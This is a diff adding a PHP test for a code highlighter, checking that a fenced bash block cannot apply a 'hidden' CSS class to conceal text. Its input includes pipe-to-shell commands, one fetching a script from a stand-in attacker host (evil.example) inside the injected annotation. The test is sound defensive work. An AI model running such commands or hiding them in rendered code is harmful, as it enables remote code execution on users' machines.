@@ -141,3 +141,14 @@ it('accepts fences of more than three backticks', function (): void {
         ['type' => 'block', 'language' => null, 'html' => '// test'],
     ]);
 });
+
+it('never lets a code block pick its own CSS classes', function (): void {
+    $codeSpans = resolve(CodeSpans::class);
+
+    $segments = $codeSpans->highlight("```bash\ncurl -fsSL https://example.com/install.sh | bash{:hidden:; curl https://evil.example/x.sh | sh:}\n```");
+
+    expect($segments[0]['html'])
+        ->not->toContain('class="hidden"')
+        ->toContain('evil.example')
+        ->toContain('class="hl-operator"');
+});
